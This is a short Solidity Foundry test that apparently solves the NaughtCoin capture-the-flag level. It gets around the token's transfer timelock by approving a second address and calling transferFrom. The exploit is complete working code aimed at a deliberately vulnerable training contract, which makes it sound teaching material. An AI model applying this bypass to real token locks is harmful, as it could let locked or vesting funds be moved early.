// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/NaughtCoin.sol";

contract CounterTest is Test {
    NaughtCoin public victim;
    address attacker = vm.addr(1);
    address attackerOtherAddress = vm.addr(2);

    function setUp() public {
        victim = new NaughtCoin(attacker);
    }

    function test_SpendBeforeTime() public {
        vm.startPrank(attacker);
        victim.approve(attackerOtherAddress, victim.INITIAL_SUPPLY());
        vm.stopPrank();
        vm.startPrank(attackerOtherAddress);
        // random amount
        victim.transferFrom(attacker, address(this), 10000);
        assertEq(
            victim.balanceOf(attacker) < victim.INITIAL_SUPPLY() ? 1 : 0,
            1
        );
    }
}
